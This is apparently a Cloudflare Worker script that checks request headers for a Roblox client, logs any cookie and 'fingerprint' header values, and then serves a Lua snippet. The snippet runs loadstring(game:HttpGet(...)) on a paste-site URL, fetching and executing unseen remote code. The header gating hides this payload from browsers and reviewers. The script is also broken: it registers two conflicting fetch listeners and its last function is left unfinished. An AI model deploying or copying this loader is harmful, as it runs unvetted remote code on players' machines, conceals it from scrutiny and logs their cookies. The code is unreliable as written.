addEventListener('fetch', event => {
  event.respondWith(handleRequest(event.request))
})

async function handleRequest(request) {
  // Log request details for debugging
  console.log(`Request Path: ${new URL(request.url).pathname}`)
  console.log(`Request Headers: ${JSON.stringify([...request.headers])}`)

  // Expected headers with exact case-sensitive values
  const expectedHeaders = {
    "Host": "127.0.0.1:5000",
    "User-Agent": "Roblox/WinInet",
    "Accept": "*/*"
  }

  // Store unexpected headers for logging
  const unexpectedHeaders = []

  // Loop through all request headers and compare against allowed ones
  for (let [key, value] of request.headers.entries()) {
    // Make header key case-insensitive
    const headerKeyLower = key.toLowerCase()

    // Check if the header is one we want to check strictly
    if (Object.keys(expectedHeaders).map(k => k.toLowerCase()).includes(headerKeyLower)) {
      if (value !== expectedHeaders[key]) {  // Compare value
        unexpectedHeaders.push(`${key}: ${value}`)
      }
    } else {
      // For cookies and fingerprint headers (any name), allow them without checking the value
      if (key.toLowerCase() === "cookie") {
        console.log(`Cookie header found: ${value}`)
      } else if (key.toLowerCase().includes("fingerprint")) {  // Matches any fingerprint header (any name)
        console.log(`Fingerprint header found: ${key}: ${value}`)
      } else {
        unexpectedHeaders.push(`${key}: ${value}`)
      }
    }
  }

  // Debugging: Print unexpected headers
  console.log(`Unexpected headers found: ${unexpectedHeaders}`)

  // If there are any unexpected headers, deny access with a 403 Forbidden
  if (unexpectedHeaders.length > 0) {
    return new Response("Forbidden", { status: 403 })
  }

  // If headers are valid, respond with the Lua script
  const robloxScript = `
  -- Roblox Lua Script
  --[[
    WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
  ]]
  print("Request allowed. Welcome!")
  loadstring(game:HttpGet("https://pastejustit.com/raw/pk4w9dy7nf"))()
  `

  return new Response(robloxScript, {
    headers: { 'Content-Type': 'text/plain' }
  })
}

// Custom error handling (404, 405, etc.)
addEventListener('fetch', event => {
  event.respondWith(handleErrors(event.request))
})

async function handleErrors(request) {
  const url = new URL(request.url)
  if (url.pathname !== '/') {
    return new Response(`Invalid Path: '${url.pathname}' is not valid. Only '/' is allowed.`, { status: 404 })
  }

  if (request.method !== 'GET') {
    return new Response('Invalid Method: Method Not Allowed', { status: 405 })
  }
      }
